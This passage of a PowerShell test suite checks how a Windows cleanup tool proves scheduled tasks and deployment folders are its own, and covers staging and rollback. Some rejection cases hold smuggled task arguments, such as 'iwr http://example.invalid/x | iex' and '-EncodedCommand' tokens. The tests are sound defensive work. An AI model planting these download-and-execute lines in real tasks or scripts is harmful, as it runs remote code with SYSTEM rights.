        Assert-Equal '<PowerShell host>' ([string]$hostFindings[0].Path) 'the missing-host finding has no printable path'
        Assert-Equal 0 @(@($withHost.Untrusted) | Where-Object { [string]$_.Reason -like '*No machine-trusted PowerShell host*' }).Count `
            'a missing host was reported while a host was available'

        # Exact, not a lower bound: the deployed paths alone already satisfy '-ge', which is how an
        # ancestor walk can be removed and stay green. Losing the host chain must cost exactly the
        # ancestors that only the host contributed, and nothing else.
        Assert-True ($expectedWithHost -gt $expectedWithoutHost) 'the host chain contributes nothing, so this case proves nothing'
        Assert-Equal $expectedWithHost $withHost.CheckedCount 'the two chains were not both walked'
        Assert-Equal $expectedWithoutHost $withoutHost.CheckedCount `
            'CheckedCount stopped counting the paths that were actually checked'
        Assert-Equal (@($withHost.Untrusted).Count + 1) @($withoutHost.Untrusted).Count `
            'the findings collected before the host lookup did not survive it'
    }
}

# ---------------------------------------------------------------------------------------------
# Scheduled-task ownership proof (ledger P0-4)
# ---------------------------------------------------------------------------------------------

Test-Case 'Get-WacTaskScriptPath reads the -File argument in both quoted and bare forms' {
    Assert-Equal 'C:\Program Files\WindowsAutoCleanup\Run.ps1' `
        (Get-WacTaskScriptPath -Arguments '-NoProfile -File "C:\Program Files\WindowsAutoCleanup\Run.ps1" -Scheduled')
    Assert-Equal 'C:\Wac\Run.ps1' (Get-WacTaskScriptPath -Arguments '-NoProfile -File C:\Wac\Run.ps1 -Scheduled')
    Assert-Equal $null (Get-WacTaskScriptPath -Arguments '-NoProfile -Command Get-Date')
    Assert-Equal $null (Get-WacTaskScriptPath -Arguments '')
    Assert-Equal $null (Get-WacTaskScriptPath -Arguments '-NoProfile -Filesystem C:\Wac\Run.ps1')
}

Test-Case 'Test-WacTaskIsOurs accepts every argument string this version can register, and only those' {
    Invoke-InDeploymentSandbox -Prefix 'task-ours' -Body {
        param($sandbox)

        $null = $sandbox
        $root = Get-WacNormalizedPath -Path (Get-WacDeploymentRoot)
        $runScript = Join-Path -Path $root -ChildPath 'Run.ps1'
        $candidates = @(Get-WacTaskActionArgumentCandidate -RunScript $runScript)

        Assert-Equal 8 $candidates.Count 'three independent switches produce eight registrable argument strings'
        Assert-Equal 8 @($candidates | Sort-Object -Unique).Count 'two switch combinations collapsed to the same string'

        foreach ($arguments in $candidates) {
            $task = New-StubTask -TaskPath (Get-WacTaskFolder) -Description ('anything ' + (Get-WacTaskSentinel)) `
                -Action @((New-StubAction -Execute $script:WindowsPowerShell -Arguments $arguments -WorkingDirectory $root))

            $proof = Test-WacTaskIsOurs -Task $task

            Assert-True $proof.IsOurs ('[{0}] {1}' -f $arguments, [string]$proof.Reason)
            Assert-False $proof.IsLegacy
            Assert-Equal 'WindowsAutoCleanup' $proof.TaskName
            Assert-Equal (Get-WacTaskFolder) $proof.TaskPath
            Assert-Equal $runScript ([string]$proof.ScriptPath)
        }
    }
}

Test-Case 'Test-WacTaskIsOurs refuses a sentinel task whose action is not EXACTLY one it registers' {
    # Ledger B2-3. The old proof extracted a script path with a regex and accepted anything else in
    # the string, so a -Command payload could carry a trailing statement and still be judged ours -
    # and that payload runs as SYSTEM. Every case here differs from a registrable string by the
    # smallest edit that matters.
    Invoke-InDeploymentSandbox -Prefix 'task-inexact' -Body {
        param($sandbox)

        $null = $sandbox
        $root = Get-WacNormalizedPath -Path (Get-WacDeploymentRoot)
        $runScript = Join-Path -Path $root -ChildPath 'Run.ps1'
        $exact = @(Get-WacTaskActionArgumentCandidate -RunScript $runScript)[0]

        $foreign = Join-Path -Path $sandbox -ChildPath 'elsewhere\Run.ps1'
        $outside = @(Get-WacTaskActionArgumentCandidate -RunScript $foreign)[0]

        $cases = @(
            @{ Name = 'trailing statement appended to the -Command payload'
               Arguments = ($exact -replace '; exit \$LASTEXITCODE"$', '; iwr http://example.invalid/x | iex; exit $LASTEXITCODE"') },
            @{ Name = 'trailing token after the payload'; Arguments = ($exact + ' -EncodedCommand ZQBjAGgAbwA=') },
            @{ Name = 'leading token before the host switches'; Arguments = ('-EncodedCommand ZQBjAGgAbwA= ' + $exact) },
            @{ Name = 'the script path swapped for one outside the deployment root'; Arguments = $outside },
            @{ Name = 'the pre-1.2 -File form, which this version never registers'
               Arguments = ('-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "{0}" -Scheduled' -f $runScript) },
            @{ Name = 'no script reference at all'; Arguments = '-NoProfile -Command Get-Date' },
            @{ Name = 'empty'; Arguments = '' }
        )

        foreach ($case in $cases) {
            Assert-False ([string]::Equals($case.Arguments, $exact, [System.StringComparison]::Ordinal)) `
                ('[{0}] is identical to a registrable string, so it proves nothing' -f $case.Name)

            $task = New-StubTask -TaskPath (Get-WacTaskFolder) -Description ('x ' + (Get-WacTaskSentinel)) `
                -Action @((New-StubAction -Execute $script:WindowsPowerShell -Arguments $case.Arguments -WorkingDirectory $root))

            $proof = Test-WacTaskIsOurs -Task $task

            Assert-False $proof.IsOurs ('[{0}] was accepted as ours' -f $case.Name)
            Assert-True ($proof.Reason -match 'not one this version registers') ('[{0}]: {1}' -f $case.Name, [string]$proof.Reason)
        }
    }
}

Test-Case 'Test-WacTaskIsOurs refuses a sentinel task whose working directory is not the deployment root' {
    Invoke-InDeploymentSandbox -Prefix 'task-workdir' -Body {
        param($sandbox)

        $root = Get-WacNormalizedPath -Path (Get-WacDeploymentRoot)
        $arguments = @(Get-WacTaskActionArgumentCandidate -RunScript (Join-Path -Path $root -ChildPath 'Run.ps1'))[0]

        $task = New-StubTask -TaskPath (Get-WacTaskFolder) -Description ('x ' + (Get-WacTaskSentinel)) `
            -Action @((New-StubAction -Execute $script:WindowsPowerShell -Arguments $arguments -WorkingDirectory $sandbox))

        $proof = Test-WacTaskIsOurs -Task $task

        Assert-False $proof.IsOurs 'a task whose action starts in someone else''s directory was accepted'
        Assert-True ($proof.Reason -match 'working directory') ([string]$proof.Reason)
    }
}

Test-Case 'Test-WacTaskIsOurs rejects a foreign task that merely shares our name' {
    Invoke-InDeploymentSandbox -Prefix 'task-foreign' -Body {
        param($sandbox)

        $null = $sandbox
        $arguments = '-NoProfile -File "{0}" -Scheduled' -f (Join-Path -Path (Get-WacDeploymentRoot) -ChildPath 'Run.ps1')
        $task = New-StubTask -TaskPath (Get-WacTaskFolder) -Description 'Some other daily job' `
            -Action @((New-StubAction -Execute $script:WindowsPowerShell -Arguments $arguments))

        $proof = Test-WacTaskIsOurs -Task $task

        Assert-False $proof.IsOurs
        Assert-True ($proof.Reason -match 'sentinel') ([string]$proof.Reason)
    }
}

Test-Case 'Test-WacTaskIsOurs rejects a PATH-resolved executable' {
    Invoke-InDeploymentSandbox -Prefix 'task-path' -Body {
        param($sandbox)

        $null = $sandbox
        $arguments = @(Get-WacTaskActionArgumentCandidate -RunScript (Join-Path -Path (Get-WacDeploymentRoot) -ChildPath 'Run.ps1'))[0]
        $sentinel = 'x ' + (Get-WacTaskSentinel)

        foreach ($executable in @('pwsh.exe', 'powershell.exe', 'wt.exe', 'C:pwsh.exe', '', '\\server\share\pwsh.exe')) {
            $task = New-StubTask -TaskPath (Get-WacTaskFolder) -Description $sentinel `
                -Action @((New-StubAction -Execute $executable -Arguments $arguments))

            $proof = Test-WacTaskIsOurs -Task $task

            Assert-False $proof.IsOurs ('[{0}] was accepted as a rooted local host' -f $executable)
            Assert-True ($proof.Reason -match 'rooted local path') ([string]$proof.Reason)
        }
    }
}

Test-Case 'Test-WacTaskIsOurs rejects a task that does not have exactly one action' {
    Invoke-InDeploymentSandbox -Prefix 'task-actions' -Body {
        param($sandbox)

        $null = $sandbox
        $arguments = @(Get-WacTaskActionArgumentCandidate -RunScript (Join-Path -Path (Get-WacDeploymentRoot) -ChildPath 'Run.ps1'))[0]
        $action = New-StubAction -Execute $script:WindowsPowerShell -Arguments $arguments
        $sentinel = 'x ' + (Get-WacTaskSentinel)

        $multi = Test-WacTaskIsOurs -Task (New-StubTask -TaskPath (Get-WacTaskFolder) -Description $sentinel -Action @($action, $action))
        Assert-False $multi.IsOurs 'a two-action task was accepted'
        Assert-True ($multi.Reason -match '2 actions') ([string]$multi.Reason)

        $none = Test-WacTaskIsOurs -Task (New-StubTask -TaskPath (Get-WacTaskFolder) -Description $sentinel -Action @())
        Assert-False $none.IsOurs 'an action-less task was accepted'
        Assert-True ($none.Reason -match '0 actions') ([string]$none.Reason)
    }
}

Test-Case 'Test-WacTaskIsOurs adopts the exact pre-1.2 task, whatever host it was pointed at' {
    # The measured pre-1.2 registration. Its host came from `Get-Command pwsh.exe`, so on a machine
    # with a PORTABLE PowerShell it is a PATH-resolved binary on a secondary drive - which is the
    # whole reason the old task is dangerous and has to be removed. Demanding a canonical Execute
    # here would refuse it, leave the vulnerable registration running, and add a second task beside
    # it. Both shapes are asserted, because covering only the canonical one is exactly the mistake.
    Invoke-InDeploymentSandbox -Prefix 'task-legacy' -Body {
        param($sandbox)

        $null = $sandbox
        $legacyScript = 'C:\Users\me\WindowsAutoCleanup\Run.ps1'

        $hosts = @(
            @{ Name = 'canonical Windows PowerShell'; Execute = $script:WindowsPowerShell },
            @{ Name = 'portable pwsh on a secondary drive'; Execute = 'D:\Portable\PowerShell\pwsh.exe' },
            @{ Name = 'PATH-resolved pwsh.exe'; Execute = 'pwsh.exe' }
        )

        foreach ($entry in $hosts) {
            foreach ($resetBase in @($true, $false)) {
                $task = New-TestLegacyTask -Execute $entry.Execute -ScriptPath $legacyScript -ResetWindowsUpdateBase:$resetBase

                $refused = Test-WacTaskIsOurs -Task $task
                Assert-False $refused.IsOurs ('[{0}] was adopted without -AllowLegacyMigration' -f $entry.Name)
                Assert-True ($refused.Reason -match 'sentinel') ([string]$refused.Reason)

                $adopted = Test-WacTaskIsOurs -Task $task -AllowLegacyMigration
                Assert-True $adopted.IsOurs ('[{0}] resetBase={1}: {2}' -f $entry.Name, $resetBase, [string]$adopted.Reason)
                Assert-True $adopted.IsLegacy 'an adopted pre-1.2 task must be flagged legacy'
                Assert-Equal $legacyScript ([string]$adopted.ScriptPath)
                Assert-Equal '\' $adopted.TaskPath
            }
        }
    }
}

Test-Case 'Test-WacTaskIsOurs refuses every near-miss legacy task' {
    Invoke-InDeploymentSandbox -Prefix 'task-legacy-miss' -Body {
        param($sandbox)

        $null = $sandbox
        $description = 'Runs WindowsAutoCleanup daily to silently remove explicitly allowed temporary files and cache locations from drive C:.'
        $good = '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "C:\Users\me\WindowsAutoCleanup\Run.ps1" -Scheduled'

        $cases = @(
            @{ Name = 'no -Scheduled'; TaskPath = '\'; Description = $description; Arguments = '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "C:\Users\me\WindowsAutoCleanup\Run.ps1"'; Pattern = 'pre-1\.2 -File Run\.ps1 -Scheduled form' },
            @{ Name = 'foreign description'; TaskPath = '\'; Description = 'Unrelated cleanup task'; Arguments = $good; Pattern = 'pre-1\.2 WindowsAutoCleanup description' },
            @{ Name = 'not at the root task path'; TaskPath = (Get-WacTaskFolder); Description = $description; Arguments = $good; Pattern = 'root task path' },
            @{ Name = 'not a Run.ps1'; TaskPath = '\'; Description = $description; Arguments = '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "C:\Users\me\WindowsAutoCleanup\Other.ps1" -Scheduled'; Pattern = 'pre-1\.2 -File Run\.ps1 -Scheduled form' },
            @{ Name = 'no -File'; TaskPath = '\'; Description = $description; Arguments = '-NoProfile -Command Get-Date'; Pattern = 'pre-1\.2 -File Run\.ps1 -Scheduled form' },
            # The injection shapes. The old proof matched -File anywhere in the string and ignored
            # everything else, so all three of these were adopted and unregistered on evidence that
            # did not identify them - and, worse, the same permissiveness in the sentinel branch
            # would have run them.
            @{ Name = 'trailing -Command after the legacy shape'; TaskPath = '\'; Description = $description; Arguments = ($good + ' -Command "iwr http://example.invalid/x | iex"'); Pattern = 'pre-1\.2 -File Run\.ps1 -Scheduled form' },
            @{ Name = 'leading tokens before the legacy shape'; TaskPath = '\'; Description = $description; Arguments = ('-EncodedCommand ZQBjAGgAbwA= ' + $good); Pattern = 'pre-1\.2 -File Run\.ps1 -Scheduled form' },
            @{ Name = 'an unquoted script path'; TaskPath = '\'; Description = $description; Arguments = '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\me\WindowsAutoCleanup\Run.ps1 -Scheduled'; Pattern = 'pre-1\.2 -File Run\.ps1 -Scheduled form' },
            @{ Name = 'a second switch the old installer never wrote'; TaskPath = '\'; Description = $description; Arguments = ($good + ' -PruneSupersededDrivers'); Pattern = 'pre-1\.2 -File Run\.ps1 -Scheduled form' }
        )

        foreach ($case in $cases) {
            $task = New-StubTask -TaskPath $case.TaskPath -Description $case.Description `
                -Action @((New-StubAction -Execute $script:WindowsPowerShell -Arguments $case.Arguments))

            $proof = Test-WacTaskIsOurs -Task $task -AllowLegacyMigration

            Assert-False $proof.IsOurs ('legacy migration accepted [{0}]' -f $case.Name)
            Assert-True ($proof.Reason -match $case.Pattern) ('[{0}]: {1}' -f $case.Name, $proof.Reason)
        }
    }
}

Test-Case 'Test-WacTaskIsOurs honours an explicitly supplied deployment root' {
    $arguments = @(Get-WacTaskActionArgumentCandidate -RunScript 'C:\Custom\Deployment\Run.ps1')[0]
    $task = New-StubTask -TaskPath (Get-WacTaskFolder) -Description ('x ' + (Get-WacTaskSentinel)) `
        -Action @((New-StubAction -Execute $script:WindowsPowerShell -Arguments $arguments -WorkingDirectory 'C:\Custom\Deployment'))

    $matched = Test-WacTaskIsOurs -Task $task -DeploymentRoot 'C:\Custom\Deployment'
    Assert-True $matched.IsOurs ([string]$matched.Reason)

    $mismatched = Test-WacTaskIsOurs -Task $task -DeploymentRoot 'C:\Custom\Other'
    Assert-False $mismatched.IsOurs 'the supplied deployment root was ignored'
}

# ---------------------------------------------------------------------------------------------
# ONE cross-operation lock, and one version string (ledger B2-3)
# ---------------------------------------------------------------------------------------------

function Get-TestScriptAst {
    param([Parameter(Mandatory = $true)][string]$Name)

    $path = Join-Path -Path $script:RepoRoot -ChildPath $Name
    $tokens = $null
    $errors = $null
    $ast = [System.Management.Automation.Language.Parser]::ParseFile($path, [ref]$tokens, [ref]$errors)
    Assert-Equal 0 @($errors).Count ('{0} does not parse' -f $Name)
    return $ast
}

function Get-TestParameterDefault {
    <#
    .SYNOPSIS
        The source text of a script parameter's default value expression, or $null.
    #>
    param(
        [Parameter(Mandatory = $true)]$Ast,
        [Parameter(Mandatory = $true)][string]$Parameter
    )

    if (-not $Ast.ParamBlock) { return $null }
    foreach ($entry in @($Ast.ParamBlock.Parameters)) {
        if ([string]$entry.Name.VariablePath.UserPath -ine $Parameter) { continue }
        if ($null -eq $entry.DefaultValue) { return '' }
        return [string]$entry.DefaultValue.Extent.Text
    }
    return $null
}

Test-Case 'The runtime, the installer and the uninstaller all take the SAME machine-wide lock' {
    # Ledger B2-3. The entry points took 'Global\WindowsAutoCleanupInstaller' while Run.ps1 took
    # 'Global\WindowsAutoCleanup', so a cleanup run and a deployment replacement could not see each
    # other at all: the uninstaller could delete the tree a live run was executing.
    #
    # Run.ps1 does not import this module, so its -MutexName default is a literal that has to be
    # pinned from outside. Asserted through the parsed AST rather than a text grep, so reformatting
    # is tolerated and swapping the literal is not.
    $expected = Get-WacOperationLockName
    Assert-Equal 'Global\WindowsAutoCleanup' $expected 'the shared lock name changed; every installed Run.ps1 command line names the old one'

    $runDefault = Get-TestParameterDefault -Ast (Get-TestScriptAst -Name 'Run.ps1') -Parameter 'MutexName'
    Assert-True ($null -ne $runDefault) 'Run.ps1 no longer exposes -MutexName, which is part of its public surface'
    Assert-Equal ("'" + $expected + "'") $runDefault 'Run.ps1 defaults to a different lock from the one the installer takes'

    foreach ($name in @('Install-WindowsAutoCleanupTask.ps1', 'Uninstall-WindowsAutoCleanupTask.ps1')) {
        $text = [System.IO.File]::ReadAllText((Join-Path -Path $script:RepoRoot -ChildPath $name))
        Assert-True ($text -match '(?m)Enter-WacSingleInstance -Name \(Get-WacOperationLockName\)') `
            ('{0} does not take the shared cross-operation lock' -f $name)
        Assert-False ($text -match 'WindowsAutoCleanupInstaller') `
            ('{0} still names the old installer-only lock' -f $name)
    }
}

Test-Case 'The manifest version is the version Run.ps1 reports' {
    $ast = Get-TestScriptAst -Name 'Run.ps1'
    $assignments = @($ast.FindAll({
        param($node)
        $node -is [System.Management.Automation.Language.AssignmentStatementAst]
    }, $true))

    $declared = @($assignments |
        Where-Object { [string]$_.Left.Extent.Text -eq '$script:Version' } |
        ForEach-Object { [string]$_.Right.Extent.Text })

    Assert-Equal 1 $declared.Count 'Run.ps1 no longer declares exactly one $script:Version'
    Assert-Equal ("'" + (Get-WacDeploymentVersion) + "'") $declared[0] `
        'the deployment manifest would record a version Run.ps1 does not claim'
}

# ---------------------------------------------------------------------------------------------
# Deployment ownership: a directory at the expected path is not evidence (ledger B2-3)
# ---------------------------------------------------------------------------------------------

Test-Case 'A fresh deployment is Managed, and a SECOND identical run is still benign' {
    # The trap this case exists for: a previous wave shipped a check whose own leftovers made every
    # LATER run refuse. The steady state after an install is an installed deployment, so the proof
    # is run twice against the same persistent tree and both answers have to be benign.
    Invoke-InDeploymentSandbox -Prefix 'own-managed' -Body {
        param($sandbox)

        $source = New-TestCheckout -Path (Join-Path -Path $sandbox -ChildPath 'checkout')
        $deployment = Install-WacDeployment -SourceRoot $source

        $first = Get-WacDeploymentOwnership -DeploymentRoot $deployment.DeploymentRoot
        Assert-Equal 'Managed' $first.Kind ([string]$first.Reason)
        Assert-True $first.IsOurs ([string]$first.Reason)
        Assert-False $first.Tampered (((@($first.Findings)) -join '; '))
        Assert-Equal (Get-WacDeploymentVersion) ([string]$first.Version)

        # Same state, asked again. Nothing the first call did may change the answer.
        $second = Get-WacDeploymentOwnership -DeploymentRoot $deployment.DeploymentRoot
        Assert-Equal 'Managed' $second.Kind ([string]$second.Reason)
        Assert-True $second.IsOurs ([string]$second.Reason)
        Assert-False $second.Tampered 'the second reading of an untouched deployment reported tampering'

        # The task run 1 registered, exactly as the installer builds it. Run 2 has to recognise it
        # as ours; if it did not, the installer would refuse to replace it (exit 7) on every machine
        # that already has WindowsAutoCleanup installed - a benign steady state producing a security
        # refusal, which is the defect a previous wave shipped and an adversarial reviewer caught.
        $runOneTask = New-StubTask -TaskPath (Get-WacTaskFolder) -Description (Get-WacTaskDescription) `
            -Action @((New-StubAction -Execute $script:WindowsPowerShell `
                -Arguments (Get-WacTaskActionArgument -RunScript $deployment.RunScript) `
                -WorkingDirectory $deployment.DeploymentRoot))

        # And a reinstall over it - the real second run - still lands Managed rather than refusing.
        $again = Install-WacDeployment -SourceRoot $source
        $third = Get-WacDeploymentOwnership -DeploymentRoot $again.DeploymentRoot
        Assert-Equal 'Managed' $third.Kind ([string]$third.Reason)
        Assert-False $third.Tampered 'a reinstall left the deployment disagreeing with its own manifest'

        $recognised = Test-WacTaskIsOurs -Task $runOneTask -DeploymentRoot $again.DeploymentRoot
        Assert-True $recognised.IsOurs `
            ('run 2 did not recognise the task run 1 registered, so every installed machine would be refused: ' + [string]$recognised.Reason)
        Assert-False $recognised.IsLegacy
    }
}

Test-Case 'Ownership adopts a pre-manifest deployment instead of stranding every installed machine' {
    # A BENIGN, EXPECTED steady state - a machine that installed before manifests existed - must
    # never produce a security refusal. Refusing it would mean the upgrade could not replace the old
    # tree and the uninstaller could not remove it, forever.
    Invoke-InDeploymentSandbox -Prefix 'own-unmanaged' -Body {
        param($sandbox)

        $source = New-TestCheckout -Path (Join-Path -Path $sandbox -ChildPath 'checkout')
        $deployment = Install-WacDeployment -SourceRoot $source
        [System.IO.File]::Delete((Get-WacDeploymentManifestPath -DeploymentRoot $deployment.DeploymentRoot))

        $ownership = Get-WacDeploymentOwnership -DeploymentRoot $deployment.DeploymentRoot
        Assert-Equal 'Unmanaged' $ownership.Kind ([string]$ownership.Reason)
        Assert-True $ownership.IsOurs 'a pre-manifest deployment was refused, stranding every already-installed machine'

        # Twice, for the same reason as above.
        $second = Get-WacDeploymentOwnership -DeploymentRoot $deployment.DeploymentRoot
        Assert-Equal 'Unmanaged' $second.Kind ([string]$second.Reason)
        Assert-True $second.IsOurs ([string]$second.Reason)
    }
}

Test-Case 'Ownership refuses a same-name directory that is not ours' {
    Invoke-InDeploymentSandbox -Prefix 'own-foreign' -Body {
        param($sandbox)

        $null = $sandbox
        $root = Get-WacNormalizedPath -Path (Get-WacDeploymentRoot)

        # A directory sitting exactly where we deploy, belonging to something else entirely.
        [void][System.IO.Directory]::CreateDirectory((Join-Path -Path $root -ChildPath 'bin'))
        [System.IO.File]::WriteAllText((Join-Path -Path $root -ChildPath 'bin\other.exe'), 'x')

        $foreign = Get-WacDeploymentOwnership -DeploymentRoot $root
        Assert-Equal 'Foreign' $foreign.Kind ([string]$foreign.Reason)
        Assert-False $foreign.IsOurs 'a directory holding somebody else''s files was claimed as ours'
        Assert-True (@($foreign.Findings) -contains 'bin') (((@($foreign.Findings)) -join '; '))
        Assert-True (Test-Path -LiteralPath (Join-Path -Path $root -ChildPath 'bin\other.exe')) `
            'the ownership check is read-only and must not have touched anything'
    }
}

Test-Case 'Ownership refuses a manifest carrying somebody else''s project identity' {
    Invoke-InDeploymentSandbox -Prefix 'own-otherid' -Body {
        param($sandbox)

        $source = New-TestCheckout -Path (Join-Path -Path $sandbox -ChildPath 'checkout')
        $deployment = Install-WacDeployment -SourceRoot $source
        $manifestPath = Get-WacDeploymentManifestPath -DeploymentRoot $deployment.DeploymentRoot

        $text = [System.IO.File]::ReadAllText($manifestPath)
        Assert-True ($text.Contains((Get-WacDeploymentProjectId))) 'the manifest does not record the project id at all'
        [System.IO.File]::WriteAllText($manifestPath, $text.Replace((Get-WacDeploymentProjectId), 'SomeOtherProduct=1'))

        $ownership = Get-WacDeploymentOwnership -DeploymentRoot $deployment.DeploymentRoot
        Assert-Equal 'Foreign' $ownership.Kind ([string]$ownership.Reason)
        Assert-False $ownership.IsOurs ([string]$ownership.Reason)
        Assert-True ($ownership.Reason -match 'different project identity') ([string]$ownership.Reason)
    }
}

Test-Case 'Ownership refuses a reparse point standing in for the deployment root' {
    Invoke-InDeploymentSandbox -Prefix 'own-link' -Body {
        param($sandbox)

        $target = Join-Path -Path $sandbox -ChildPath 'somewhere-else'
        [void][System.IO.Directory]::CreateDirectory($target)
        $root = Get-WacNormalizedPath -Path (Get-WacDeploymentRoot)

        $made = $false
        try {
            [void](New-Item -ItemType Junction -Path $root -Target $target -ErrorAction Stop)
            $made = $true
        }
        catch { $made = $false }
        if (-not $made) { Set-TestSkipped -Reason 'this host cannot create a junction, so a redirected deployment root cannot be built' }

        $ownership = Get-WacDeploymentOwnership -DeploymentRoot $root
        Assert-Equal 'Foreign' $ownership.Kind ([string]$ownership.Reason)
        Assert-False $ownership.IsOurs 'deleting a reparse point at the deployment path would act on whatever it points at'
        Assert-True ($ownership.Reason -match 'reparse point') ([string]$ownership.Reason)
        Assert-True (Test-Path -LiteralPath $target -PathType Container) 'the junction target was touched'
    }
}

Test-Case 'Ownership reports a modified file without making the deployment unremovable' {
    # Tampering is EVIDENCE, not a refusal. Flipping ownership on a hash mismatch would mean one
    # edited file locks the tree in place forever: neither replaceable nor removable.
    Invoke-InDeploymentSandbox -Prefix 'own-tamper' -Body {
        param($sandbox)

        $source = New-TestCheckout -Path (Join-Path -Path $sandbox -ChildPath 'checkout')
        $deployment = Install-WacDeployment -SourceRoot $source
        [System.IO.File]::WriteAllText((Join-Path -Path $deployment.DeploymentRoot -ChildPath 'Run.ps1'), '# edited')

        $ownership = Get-WacDeploymentOwnership -DeploymentRoot $deployment.DeploymentRoot
        Assert-Equal 'Managed' $ownership.Kind ([string]$ownership.Reason)
        Assert-True $ownership.IsOurs 'an edited file made our own deployment impossible to replace or remove'
        Assert-True $ownership.Tampered 'a changed file was not reported at all'
        Assert-Equal 1 @($ownership.Findings).Count (((@($ownership.Findings)) -join '; '))
        Assert-True (((@($ownership.Findings)) -join '; ') -match 'Run\.ps1') (((@($ownership.Findings)) -join '; '))
    }
}

Test-Case 'Ownership treats an absent and an empty deployment path as safe to create' {
    Invoke-InDeploymentSandbox -Prefix 'own-absent' -Body {
        param($sandbox)

        $null = $sandbox
        $root = Get-WacNormalizedPath -Path (Get-WacDeploymentRoot)

        $absent = Get-WacDeploymentOwnership -DeploymentRoot $root
        Assert-Equal 'Absent' $absent.Kind ([string]$absent.Reason)
        Assert-True $absent.IsOurs ([string]$absent.Reason)
        Assert-False $absent.Exists

        [void][System.IO.Directory]::CreateDirectory($root)
        $empty = Get-WacDeploymentOwnership -DeploymentRoot $root
        Assert-Equal 'Unmanaged' $empty.Kind ([string]$empty.Reason)
        Assert-True $empty.IsOurs 'an empty directory at the deployment path blocked the install'
    }
}

# ---------------------------------------------------------------------------------------------
# Stage, verify, switch, roll back (ledger B2-3)
# ---------------------------------------------------------------------------------------------

Test-Case 'New-WacDeploymentStage builds the whole tree without touching the live deployment' {
    Invoke-InDeploymentSandbox -Prefix 'stage-isolated' -Body {
        param($sandbox)

        $source = New-TestCheckout -Path (Join-Path -Path $sandbox -ChildPath 'checkout')
        $live = Install-WacDeployment -SourceRoot $source
        [System.IO.File]::WriteAllText((Join-Path -Path $live.DeploymentRoot -ChildPath 'Run.ps1'), '# live v1')

        $second = New-TestCheckout -Path (Join-Path -Path $sandbox -ChildPath 'checkout2') -RunContent '# staged v2'
        $stage = New-WacDeploymentStage -SourceRoot $second

        Assert-Equal (Get-WacDeploymentSlotPath).Staging $stage.StagingRoot
        # Four, not the five files on disk: a manifest cannot carry its own hash, so it is not in
        # its own list.
        Assert-Equal 4 $stage.FileCount 'Run.ps1, LICENSE and the two src modules are recorded'
        Assert-Equal '# staged v2' ([System.IO.File]::ReadAllText((Join-Path -Path $stage.StagingRoot -ChildPath 'Run.ps1')))

        # The point of staging: the file the CURRENTLY registered task would run is untouched.
        Assert-Equal '# live v1' ([System.IO.File]::ReadAllText((Join-Path -Path $live.DeploymentRoot -ChildPath 'Run.ps1')))

        $switched = Switch-WacDeploymentStage -KeepPrevious
        Assert-True $switched.PreviousKept 'the previous tree was discarded, so nothing could be rolled back to'
        Assert-Equal '# staged v2' ([System.IO.File]::ReadAllText($switched.RunScript))
        Assert-True (Test-Path -LiteralPath (Get-WacDeploymentSlotPath).Previous -PathType Container)
    }
}

Test-Case 'A staged tree that does not match its own manifest is refused and cleaned up' {
    Invoke-InDeploymentSandbox -Prefix 'stage-corrupt' -Body {
        param($sandbox)

        $source = New-TestCheckout -Path (Join-Path -Path $sandbox -ChildPath 'checkout')
        $slots = Get-WacDeploymentSlotPath

        # Ownership is proven over the STAGED tree before anything goes live. Here a hash mismatch
        # is fatal, unlike on an installed tree, because it means the copy did not land intact.
        $stage = New-WacDeploymentStage -SourceRoot $source
        $ownership = Get-WacDeploymentOwnership -DeploymentRoot $stage.StagingRoot
        Assert-Equal 'Managed' $ownership.Kind ([string]$ownership.Reason)
        Assert-False $ownership.Tampered 'a freshly staged tree already disagreed with its own manifest'

        [System.IO.File]::WriteAllText((Join-Path -Path $stage.StagingRoot -ChildPath 'Run.ps1'), '# swapped after staging')
        $after = Get-WacDeploymentOwnership -DeploymentRoot $stage.StagingRoot
        Assert-True $after.Tampered 'a file replaced inside the staging slot went unnoticed'

        [void](Remove-WacDeployment -Path $slots.Staging)
        Assert-False (Test-Path -LiteralPath $slots.Staging) 'the staging slot survived'
    }
}

Test-Case 'Restore-WacDeploymentPrevious puts the previous deployment back byte for byte' {
    Invoke-InDeploymentSandbox -Prefix 'stage-rollback' -Body {
        param($sandbox)

        $first = New-TestCheckout -Path (Join-Path -Path $sandbox -ChildPath 'v1') -RunContent '# v1'
        $live = Install-WacDeployment -SourceRoot $first
        $originalHash = Get-WacDeploymentFileHash -Path $live.RunScript

        $second = New-TestCheckout -Path (Join-Path -Path $sandbox -ChildPath 'v2') -RunContent '# v2'
        [void](New-WacDeploymentStage -SourceRoot $second)
        $switched = Switch-WacDeploymentStage -KeepPrevious
        Assert-Equal '# v2' ([System.IO.File]::ReadAllText($switched.RunScript))

        $restored = Restore-WacDeploymentPrevious
        Assert-True $restored.Restored ([string]$restored.Reason)
        Assert-True $restored.HadPrevious
        Assert-Equal '# v1' ([System.IO.File]::ReadAllText($live.RunScript)) 'the rollback did not bring the previous runtime back'
        Assert-Equal $originalHash (Get-WacDeploymentFileHash -Path $live.RunScript)
        Assert-False (Test-Path -LiteralPath (Get-WacDeploymentSlotPath).Previous) 'the previous slot was left behind after a rollback'

        $ownership = Get-WacDeploymentOwnership -DeploymentRoot $live.DeploymentRoot
        Assert-Equal 'Managed' $ownership.Kind ([string]$ownership.Reason)
        Assert-False $ownership.Tampered 'the restored tree does not match the manifest it was installed with'
    }
}

Test-Case 'Rolling back a FIRST install leaves no deployment at all' {
    Invoke-InDeploymentSandbox -Prefix 'stage-rollback-first' -Body {
        param($sandbox)

        $source = New-TestCheckout -Path (Join-Path -Path $sandbox -ChildPath 'checkout')
        [void](New-WacDeploymentStage -SourceRoot $source)
        $switched = Switch-WacDeploymentStage -KeepPrevious
        Assert-False $switched.PreviousKept 'there was no previous deployment to keep'

        $restored = Restore-WacDeploymentPrevious
        Assert-True $restored.Restored ([string]$restored.Reason)
        Assert-False $restored.HadPrevious
        Assert-False (Test-Path -LiteralPath $switched.DeploymentRoot) 'the half-installed deployment was left behind'
    }
}

Test-Case 'Test-WacTaskReferencesRoot finds the deployment named anywhere in an action' {
    # What stops the uninstaller deleting the tree under a task it deliberately left alone. Each
    # case hides the path in a DIFFERENT member, because covering only the parsed script argument
    # leaves the executable and the working directory able to point at the tree unnoticed.
    $root = 'C:\Program Files\WindowsAutoCleanup'
